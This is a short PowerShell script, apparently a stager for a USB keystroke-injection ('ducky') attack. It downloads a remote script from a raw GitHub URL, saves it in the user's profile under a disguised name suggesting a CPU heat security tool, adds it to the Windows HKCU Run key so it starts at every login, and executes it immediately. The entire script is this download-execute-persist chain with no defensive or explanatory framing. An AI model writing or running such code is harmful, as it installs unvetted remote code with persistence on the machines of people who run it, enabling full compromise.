$githubUrl = "https://raw.githubusercontent.com/Gamoboy/ducky/master/CPUHeatSecurity.ps1"
$destinationPath = "$env:USERPROFILE\CPUHeatSecutity.ini.ps1"
$autorunRegistryPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
$autorunRegistryName = "CPUHeatSecurity"

Invoke-WebRequest -Uri $githubUrl -OutFile $destinationPath

Set-ItemProperty -Path $autorunRegistryPath -Name $autorunRegistryName -Value $destinationPath

Invoke-Expression -Command $destinationPath
